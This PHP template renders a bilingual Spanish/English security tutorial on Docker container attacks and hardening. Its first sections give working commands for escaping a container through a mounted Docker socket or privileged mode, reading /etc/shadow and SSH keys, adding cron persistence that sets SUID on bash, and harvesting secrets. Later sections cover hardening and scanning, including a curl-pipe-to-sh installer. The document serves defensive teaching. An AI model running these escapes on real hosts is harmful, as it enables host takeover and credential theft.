<?php
require_once __DIR__ . '/../bootstrap.php';
$pageTitle    = $lang==='es' ? 'Docker: Seguridad y Hardening de Contenedores — CyberEscudo' : 'Docker: Container Security & Hardening — CyberEscudo';
$contentTitle = $lang==='es' ? 'Docker: Seguridad y Hardening de Contenedores' : 'Docker: Container Security & Hardening';
$contentDate  = '2024-08-20';
$contentDiff  = 'intermediate';
$contentTags  = ['Docker','Contenedores','Hardening','Misconfigurations','DevSecOps'];
ob_start(); if ($lang==='es'): ?>
<div class="prose">
  <p>Docker es omnipresente en infraestructuras modernas, pero una configuración incorrecta puede exponer el host o toda la red interna. Este proyecto cubre los ataques más comunes contra contenedores Docker y las medidas de hardening para prevenirlos.</p>

  <h2>1. Enumeración en un contenedor comprometido</h2>
  <pre><code># Verificar si estamos en un contenedor:
cat /proc/1/cgroup | grep docker
ls /.dockerenv               # Existe en contenedores Docker
hostname                     # Suele ser el container ID (hash)

# Información del sistema:
uname -a
cat /etc/os-release
env                          # Variables de entorno (pueden tener credenciales)
mount | grep overlay         # Sistema de archivos overlay = contenedor

# Capacidades del proceso actual:
cat /proc/self/status | grep CapEff
# Decodificar:
capsh --decode=0000000000003000</code></pre>

  <h2>2. Escape de contenedor: montaje del socket de Docker</h2>
  <pre><code># Si el socket de Docker está montado dentro del contenedor:
ls -la /var/run/docker.sock

# Explotación — crear contenedor privilegiado con el sistema de ficheros del host:
docker -H unix:///var/run/docker.sock run -it \
  --rm \
  -v /:/host \
  alpine chroot /host sh

# Alternativa sin imagen local — descargar Alpine y escapar:
docker -H unix:///var/run/docker.sock pull alpine
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh

# Una vez dentro del host:
cat /etc/shadow
crontab -l -u root
ls /root/.ssh/</code></pre>

  <h2>3. Escape de contenedor: modo privilegiado</h2>
  <pre><code># Detectar si el contenedor corre como privilegiado:
cat /proc/self/status | grep CapEff
# Si CapEff = 0000003fffffffff → privilegiado

# Explotación con montaje del disco del host:
# 1. Ver dispositivos de bloque:
fdisk -l

# 2. Montar el disco del host:
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# 3. Acceso completo al sistema de archivos:
ls /mnt/host/root
cat /mnt/host/etc/shadow

# 4. Persistencia — añadir tarea cron al host:
echo "* * * * * root chmod +s /bin/bash" >> /mnt/host/etc/crontab</code></pre>

  <h2>4. Secretos expuestos en contenedores</h2>
  <pre><code># Variables de entorno (muy común — credenciales hardcodeadas):
printenv | grep -iE "pass|secret|token|key|db_|api"

# Historial de capas de la imagen (fugas en build):
docker history imagen:tag --no-trunc
# Buscar contraseñas añadidas en RUN o ENV durante el build

# Inspecionar metadatos de la imagen:
docker inspect container_id | python3 -m json.tool | grep -iE "env|password|secret"

# Ficheros de configuración dentro del contenedor:
find / -name "*.env" -o -name "config.php" -o -name "database.yml" 2>/dev/null
cat /app/.env 2>/dev/null</code></pre>

  <h2>5. Hardening del Dockerfile</h2>
  <pre><code># MAL: imagen base genérica + root + secretos en build
FROM ubuntu:latest
ENV DB_PASSWORD=supersecret123
RUN apt-get install -y curl
COPY . /app

# BIEN: imagen minimalista + usuario no root + sin secretos
FROM python:3.12-slim

# Usuario no privilegiado:
RUN groupadd -r appuser && useradd -r -g appuser appuser

# Solo instalar lo necesario:
RUN apt-get update && apt-get install -y --no-install-recommends \
    libpq5 \
  && rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY --chown=appuser:appuser requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY --chown=appuser:appuser . .

# Cambiar a usuario sin privilegios:
USER appuser

EXPOSE 8080
CMD ["python", "app.py"]</code></pre>

  <h2>6. Hardening del daemon Docker (daemon.json)</h2>
  <pre><code># Editar /etc/docker/daemon.json:
{
  "icc": false,                    // Sin comunicación inter-contenedor
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "10m",
    "max-file": "3"
  },
  "userns-remap": "default",       // Remapear UID/GID al host
  "no-new-privileges": true,       // Evitar escalada dentro del contenedor
  "seccomp-profile": "/etc/docker/seccomp.json"
}

# Reiniciar Docker:
systemctl restart docker</code></pre>

  <h2>7. Docker run seguro</h2>
  <pre><code># Opciones de seguridad al arrancar contenedores:

docker run \
  --read-only \                         # Sistema de archivos solo lectura
  --tmpfs /tmp \                        # /tmp en memoria
  --no-new-privileges \                 # Sin nuevos privilegios
  --cap-drop ALL \                      # Quitar todas las capabilities
  --cap-add NET_BIND_SERVICE \          # Solo añadir las necesarias
  --security-opt no-new-privileges:true \
  --security-opt seccomp:default \
  --user 1000:1000 \                    # Usuario sin privilegios
  --memory 512m \                       # Limitar memoria
  --cpus 0.5 \                          # Limitar CPU
  -p 127.0.0.1:8080:8080 \             # Bind solo a localhost
  mi-imagen:latest</code></pre>

  <h2>8. Escaneo de vulnerabilidades en imágenes</h2>
  <pre><code># Trivy — escáner de vulnerabilidades en imágenes Docker:
apt install trivy
# o:
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh

# Escanear imagen:
trivy image nginx:latest
trivy image --severity HIGH,CRITICAL mi-app:latest

# Escanear contenedor en ejecución:
trivy image --input /var/lib/docker/image/overlay2/...

# Docker Bench Security (benchmark CIS para Docker):
docker run --rm -it --net host --pid host --userns host --cap-add audit_control \
  -v /etc:/etc:ro \
  -v /usr/bin/containerd:/usr/bin/containerd:ro \
  -v /usr/bin/runc:/usr/bin/runc:ro \
  -v /usr/lib/systemd:/usr/lib/systemd:ro \
  -v /var/lib:/var/lib:ro \
  -v /var/run/docker.sock:/var/run/docker.sock:ro \
  docker/docker-bench-security</code></pre>

  <h2>Checklist de seguridad Docker</h2>
  <table>
    <thead><tr><th>Medida</th><th>Comando / Configuración</th></tr></thead>
    <tbody>
      <tr><td>No exponer socket Docker</td><td>No montar <code>/var/run/docker.sock</code></td></tr>
      <tr><td>No usar modo privilegiado</td><td>Omitir <code>--privileged</code></td></tr>
      <tr><td>Usuario no root</td><td><code>USER appuser</code> en Dockerfile</td></tr>
      <tr><td>Solo capabilities necesarias</td><td><code>--cap-drop ALL --cap-add ...</code></td></tr>
      <tr><td>FS solo lectura</td><td><code>--read-only</code></td></tr>
      <tr><td>Sin secretos en imagen</td><td>Usar Docker Secrets o variables en runtime</td></tr>
      <tr><td>Escanear imagen</td><td><code>trivy image nombre:tag</code></td></tr>
      <tr><td>Benchmark CIS</td><td><code>docker/docker-bench-security</code></td></tr>
    </tbody>
  </table>
</div>
<?php else: ?>
<div class="prose">
  <p>Docker is ubiquitous in modern infrastructure, but a misconfigured container can expose the host or entire internal network. This project covers the most common Docker container attacks and the hardening measures to prevent them.</p>

  <h2>1. Enumeration Inside a Compromised Container</h2>
  <pre><code># Check if we're inside a container:
cat /proc/1/cgroup | grep docker
ls /.dockerenv
env | grep -iE "pass|secret|token|key"

# Decode current capabilities:
cat /proc/self/status | grep CapEff
capsh --decode=0000000000003000</code></pre>

  <h2>2. Container Escape: Docker Socket Mount</h2>
  <pre><code># Check if Docker socket is mounted:
ls -la /var/run/docker.sock

# Exploit — create privileged container with host filesystem:
docker -H unix:///var/run/docker.sock run -it \
  --rm \
  -v /:/host \
  alpine chroot /host sh

# Access host files:
cat /etc/shadow
ls /root/.ssh/</code></pre>

  <h2>3. Container Escape: Privileged Mode</h2>
  <pre><code># Detect privileged container:
cat /proc/self/status | grep CapEff
# CapEff = 0000003fffffffff → privileged

# Exploit — mount host disk:
fdisk -l
mkdir /mnt/host && mount /dev/sda1 /mnt/host
cat /mnt/host/etc/shadow

# Add cron persistence on host:
echo "* * * * * root chmod +s /bin/bash" >> /mnt/host/etc/crontab</code></pre>

  <h2>4. Exposed Secrets</h2>
  <pre><code># Environment variables (common leak):
printenv | grep -iE "pass|secret|token|key|db_|api"

# Image layer history:
docker history image:tag --no-trunc

# Inspect container metadata:
docker inspect container_id | python3 -m json.tool | grep -iE "env|password"

# Config files inside container:
find / -name "*.env" -o -name "config.php" 2>/dev/null</code></pre>

  <h2>5. Dockerfile Hardening</h2>
  <pre><code># BAD: generic base + root + secrets in build
FROM ubuntu:latest
ENV DB_PASSWORD=supersecret123

# GOOD: minimal image + non-root user + no secrets
FROM python:3.12-slim

RUN groupadd -r appuser && useradd -r -g appuser appuser

RUN apt-get update && apt-get install -y --no-install-recommends \
    libpq5 \
  && rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY --chown=appuser:appuser . .
RUN pip install --no-cache-dir -r requirements.txt

USER appuser
EXPOSE 8080
CMD ["python", "app.py"]</code></pre>

  <h2>6. Docker Daemon Hardening (daemon.json)</h2>
  <pre><code># Edit /etc/docker/daemon.json:
{
  "icc": false,
  "userns-remap": "default",
  "no-new-privileges": true,
  "log-driver": "json-file",
  "log-opts": { "max-size": "10m", "max-file": "3" }
}

systemctl restart docker</code></pre>

  <h2>7. Secure docker run Options</h2>
  <pre><code>docker run \
  --read-only \
  --tmpfs /tmp \
  --no-new-privileges \
  --cap-drop ALL \
  --cap-add NET_BIND_SERVICE \
  --user 1000:1000 \
  --memory 512m \
  --cpus 0.5 \
  -p 127.0.0.1:8080:8080 \
  my-image:latest</code></pre>

  <h2>8. Image Vulnerability Scanning</h2>
  <pre><code># Trivy scanner:
apt install trivy

trivy image nginx:latest
trivy image --severity HIGH,CRITICAL my-app:latest

# CIS Docker Benchmark:
docker run --rm -it --net host --pid host \
  -v /var/run/docker.sock:/var/run/docker.sock:ro \
  docker/docker-bench-security</code></pre>

  <h2>Docker Security Checklist</h2>
  <table>
    <thead><tr><th>Measure</th><th>Command / Config</th></tr></thead>
    <tbody>
      <tr><td>No Docker socket exposure</td><td>Don't mount <code>/var/run/docker.sock</code></td></tr>
      <tr><td>No privileged mode</td><td>Omit <code>--privileged</code></td></tr>
      <tr><td>Non-root user</td><td><code>USER appuser</code> in Dockerfile</td></tr>
      <tr><td>Drop capabilities</td><td><code>--cap-drop ALL --cap-add ...</code></td></tr>
      <tr><td>Read-only FS</td><td><code>--read-only</code></td></tr>
      <tr><td>No secrets in image</td><td>Use Docker Secrets or runtime env</td></tr>
      <tr><td>Scan image</td><td><code>trivy image name:tag</code></td></tr>
      <tr><td>CIS Benchmark</td><td><code>docker/docker-bench-security</code></td></tr>
    </tbody>
  </table>
</div>
<?php endif; $contentBody=ob_get_clean(); require __DIR__.'/../templates/content-page.php';
